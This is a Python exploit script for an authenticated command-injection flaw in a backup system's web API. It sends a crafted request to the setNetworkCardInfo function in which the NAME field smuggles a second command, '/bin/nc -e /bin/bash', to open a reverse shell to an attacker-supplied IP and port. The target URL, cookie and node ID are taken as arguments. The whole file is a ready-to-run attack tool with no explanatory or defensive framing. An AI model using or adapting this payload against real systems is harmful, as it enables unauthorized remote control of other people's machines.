import requests
import json
import argparse

def exploit(url, cookie_value, nodeuuid, reverse_ip, reverse_port):
    # You need the right cookie for auth RCE
    cookies = {
        'BackupSystem': cookie_value,
    }

    headers = {
        'Host': url.split("//")[-1],  # Extract host from URL
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': url,
        'Connection': 'close',
    }

    # You need the right nodeuuid
    payload = {
        "nodeuuid": nodeuuid,
        "NAME": f"; /bin/nc -e /bin/bash {reverse_ip} {reverse_port}",
        # With blank value it breaks the instance (Broke mine lmaooo)
        "IPADDR": "192.168.1.23",
        "NETMASK": "",
        "GATEWAY": "",
        "DNS": "",
        "PREFIX": ""
    }

    data = {
        'm': '8',
        'f': 'setNetworkCardInfo',
        'p': json.dumps(payload)
    }

    response = requests.post(url + '/api/', cookies=cookies, headers=headers, data=data, verify=False)
    print(response.text)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Exploit for RCE vulnerability in the target system.")
    parser.add_argument('-u', '--url', required=True, help="Target URL (e.g., https://192.168.1.23)")
    parser.add_argument('-c', '--cookie', required=True, help="Authentication cookie value for the 'BackupSystem' cookie")
    parser.add_argument('-n', '--nodeuuid', required=True, help="Specific 'nodeuuid' value required for the payload")
    parser.add_argument('-ip', '--reverse-ip', required=True, help="IP address for reverse shell connection")
    parser.add_argument('-p', '--port', type=int, required=True, help="Port number for reverse shell connection")

    args = parser.parse_args()

    exploit(args.url, args.cookie, args.nodeuuid, args.reverse_ip, args.port)
